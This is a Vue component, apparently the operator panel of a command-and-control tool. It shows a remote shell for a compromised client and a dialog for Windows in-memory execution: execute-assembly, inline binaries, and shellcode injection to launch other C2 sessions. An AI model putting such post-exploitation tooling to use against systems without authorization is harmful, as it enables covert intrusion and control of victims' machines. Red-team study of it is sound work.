<template>
  <div class="terminal-container">
    <div class="terminal">
      <!-- 显示历史命令和响应 -->
      <div id="output" class="output">
        {{ ShellStr }}
      </div>
      <!-- 输入命令 -->
      <el-input
          v-model="command"
          placeholder="输入命令..."
          @keyup.enter="sendCommand"
          @keydown.up.prevent="prevCommand"
          @keydown.down.prevent="nextCommand"
          ref="input"
      ></el-input>
    </div>

    <!-- 和 terminal 左边对齐 -->
    <div class="terminal-actions">
      <el-button type="primary" @click="dialogVisible = true">
        Windows内存执行
      </el-button>
    </div>

    <el-dialog
        v-model="dialogVisible"
        title="内存执行"
        width="500px"
        :before-close="handleClose"
    >
      <div class="dialog-content">

        <div class="mode-section">
          <el-select
              v-model="executionMode"
              placeholder="选择执行模式"
              style="width: 100%;"
          >
            <el-option
                v-for="item in modeOptions"
                :key="item.value"
                :label="item.label"
                :value="item.value"
            />
          </el-select>
        </div>
        <!--        <br>-->

        <!-- 文件选择区域 -->
        <div class="file-section">
          <el-button type="success" @click="triggerFileInput">
            选择文件
          </el-button>
          <!-- 隐藏的文件输入框 -->
          <input
              type="file"
              ref="fileInputRef"
              @change="handleFileChange"
              style="display: none;"
          />
          <!-- 显示已选择的文件名 -->
          <p v-if="selectedFile" class="file-info">
            已选择: {{ selectedFile.name }} ({{ formatFileSize(selectedFile.size) }})
          </p>
        </div>
        <!--        <br>-->

        <!-- 参数输入 -->
        <div class="param-section">
          <el-input
              v-model="inputParams"
              placeholder="请输入程序运行参数"
              clearable
          ></el-input>
        </div>

      </div>

      <template #footer>
        <span class="dialog-footer">
          <el-button @click="handleClose">取消</el-button>
          <el-button type="primary" @click="handleExecute" :disabled="!selectedFile || isExecuting">
            确定执行
          </el-button>
        </span>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref,onMounted, onUnmounted  } from 'vue'
import { ElMessage,ElMessageBox } from 'element-plus'
import ClientAPI from '@/api/clients'
import {useRoute} from "vue-router";
import {useCommandHistoryStore} from '@/stores/shellcommand'
import ListenerAPI from "@/api/listener";

const commandHistory = useCommandHistoryStore();

const route = useRoute()

const command = ref('')
const ShellStr = ref('')
const ShellStrTmp = ref('')
const uid = String(route.query.uid);

// 发送命令到后端
const sendCommand = async () => {


  if (command.value.trim() === '') return

  const currentCommand = command.value.trim()
  // 清空当前命令
  command.value = ''
  commandHistory.addCommand(uid, currentCommand)
  commandHistory.clearCurrentIndex(uid)
  try {
    ClientAPI.send_commands({uid:uid,command:currentCommand}).then((res)=>{
      ShellStrTmp.value = res.data.data
      if (ShellStr.value !==ShellStrTmp.value){
        ShellStr.value = ShellStrTmp.value
        const textarea = document.getElementById('output');
        setTimeout(() => {
          textarea.scrollTop = textarea.scrollHeight;
        }, 1); // 1毫秒的延迟
      }
    })
  } catch (error) {
    ElMessage.error('命令执行失败')
  }
}

const prevCommand = ()=>{
  const prevCmd = commandHistory.getPrevCommand(uid);
  if (prevCmd !== undefined) {
    command.value = prevCmd;
  }
}

const nextCommand = () => {
  const nextCmd = commandHistory.getNextCommand(uid);
  if (nextCmd !== undefined) {
    command.value = nextCmd;
  }
};

function GetShellContent(){
  ClientAPI.get_shellcontent({uid:uid }).then((res)=>{
    ShellStrTmp.value = res.data.data
    if (ShellStr.value !==ShellStrTmp.value){
      ShellStr.value = ShellStrTmp.value
      const textarea = document.getElementById('output');
      setTimeout(() => {
        textarea.scrollTop = textarea.scrollHeight;
      }, 1); // 1毫秒的延迟
    }
  })

}

// Dialog 显示状态
const dialogVisible = ref(false)

// 文件选择相关
const fileInputRef = ref(null) // 引用隐藏的文件输入框
const selectedFile = ref(null) // 存储选中的文件对象

// 参数输入
const inputParams = ref('') // 存储输入的参数

// 执行状态
const isExecuting = ref(false) // 标记是否正在执行

// 执行模式相关
const executionMode = ref('') // 存储选中的执行模式
// 下拉选项
const modeOptions = [
  { value: 'execute-assembly', label: 'Execute Assembly(.net程序内存执行)' },
  { value: 'inline-bin', label: 'Inline Bin(其他exe程序内存执行)' },
  { value: 'shellcode-inject', label: 'shellcode执行(执行shellcode,上线其他C2等)' },
]

// 触发隐藏的文件输入框
const triggerFileInput = () => {
  if (fileInputRef.value) {
    fileInputRef.value.click()
  }
}

// 处理文件选择变化
const handleFileChange = (event) => {
  const files = event.target.files
  if (files && files.length > 0) {
    selectedFile.value = files[0] // 只处理第一个文件
    // 可以在这里添加文件类型、大小校验
    // 例如：if (selectedFile.value.type !== 'application/pdf') { ... }
  }
}

// 格式化文件大小显示
const formatFileSize = (bytes) => {
  if (bytes === 0) return '0 Bytes'
  const k = 1024
  const sizes = ['Bytes', 'KB', 'MB', 'GB']
  const i = Math.floor(Math.log(bytes) / Math.log(k))
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i]
}

// 执行核心逻辑
const handleExecute = async () => {
  // 前置检查
  if (!selectedFile.value) {
    ElMessage.warning('请先选择一个文件！')
    return
  }

  // 确认操作 (可选)
  // try {
  //   await ElMessageBox.confirm(
  //     `确定要使用文件 "${selectedFile.value.name}" 和参数 "${inputParams.value}" 执行操作吗？`,
  //     '确认执行',
  //     {
  //       confirmButtonText: '确定',
  //       cancelButtonText: '取消',
  //       type: 'warning',
  //     }
  //   )
  // } catch {
  //   return // 用户取消
  // }

  isExecuting.value = true
  try {
    // 1. 读取文件为二进制数据 (ArrayBuffer)
    // const fileArrayBuffer = await readFileAsArrayBuffer(selectedFile.value)

    // 2. 获取输入的参数
    const params = inputParams.value.trim()
    const mode = executionMode.value

    const res = await ClientAPI.ExecuteBin({uid:uid,mode:mode,file:selectedFile.value,args:params})
    if(res.data.status===200){
      ElMessage.success("后台执行成功")
    }else{
      ElMessage.error(res.data.data)
    }


    // 可以选择在执行成功后关闭 Dialog
    dialogVisible.value = false
    resetDialog() // 重置 Dialog 状态

  } catch (error) {
    console.error('执行过程中出错:', error)
    ElMessage.error(`执行失败: ${error.message || '未知错误'}`)
  } finally {
    isExecuting.value = false
  }
}

// 将 File 对象读取为 ArrayBuffer
const readFileAsArrayBuffer = (file) => {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = () => resolve(reader.result)
    reader.onerror = () => reject(new Error('文件读取失败'))
    reader.readAsArrayBuffer(file) // 读取为 ArrayBuffer (二进制数据)
  })
}

// 关闭 Dialog 的处理
const handleClose = () => {
  // 如果正在执行，提示用户
  if (isExecuting.value) {
    ElMessageBox.confirm(
        '操作正在执行中，确定要关闭吗？',
        '提示',
        {
          confirmButtonText: '确定',
          cancelButtonText: '取消',
          type: 'warning',
        }
    ).then(() => {
      dialogVisible.value = false
      resetDialog() // 重置状态
    }).catch(() => {
      // 用户取消关闭
    })
    return
  }

  // 如果有已选文件或输入参数，提示
  if (selectedFile.value || inputParams.value) {
    ElMessageBox.confirm(
        '关闭将清除已选择的文件和输入的参数，确定要关闭吗？',
        '提示',
        {
          confirmButtonText: '确定',
          cancelButtonText: '取消',
          type: 'warning',
        }
    ).then(() => {
      dialogVisible.value = false
      resetDialog() // 重置状态
    }).catch(() => {
      // 用户取消关闭
    })
  } else {
    dialogVisible.value = false
  }
}

// 重置 Dialog 内部状态
const resetDialog = () => {
  selectedFile.value = null
  inputParams.value = ''
  executionMode.value=''

  // 注意：fileInputRef 指向的 input 元素的 value 无法直接通过 JS 重置为空字符串以触发 change 事件，
  // 但我们可以手动将其 value 设为空，下次点击选择文件时状态会正确。
  if (fileInputRef.value) {
    fileInputRef.value.value = ''
  }
}


onMounted(() => {
  // 打开界面时立即执行命令
  GetShellContent();
  // 设置一个定时器，每5秒执行一次
  const intervalId = setInterval(GetShellContent, 5000);

  // 确保在组件卸载时清除定时器
  onUnmounted(() => {
    clearInterval(intervalId);
  });
});
</script>

<style scoped>
.terminal-container {
  width: 100%;
  max-width: 1000px;
  margin: auto;             /* 让整个容器居中 */
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.terminal {
  padding: 10px;
  background-color: #222;
  color: #eee;
  border-radius: 8px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}

.terminal-actions {
  display: flex;
  justify-content: flex-start; /* 和 terminal 左边对齐 */
}

.output {
  height: 500px; /* 固定高度 */
  overflow-y: auto;
  padding: 8px;
  background-color: #333;
  border-radius: 8px;
  white-space: pre-wrap;
}

.output pre {
  margin: 0;
  font-family: monospace;
  word-wrap: break-word;
}
.terminal-actions {
  display: flex;
  justify-content: flex-start; /* 按钮靠左 */
}
.dialog-content {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.mode-section,
.file-section,
.param-section,
.action-section {
  display: flex;
  flex-direction: column;
  align-items: flex-start;
}

.file-info {
  margin-top: 10px;
  font-size: 14px;
  color: #606266;
  word-break: break-all;
}

.action-section {
  margin-top: 10px;
}

.dialog-footer {
  text-align: right;
}

</style>
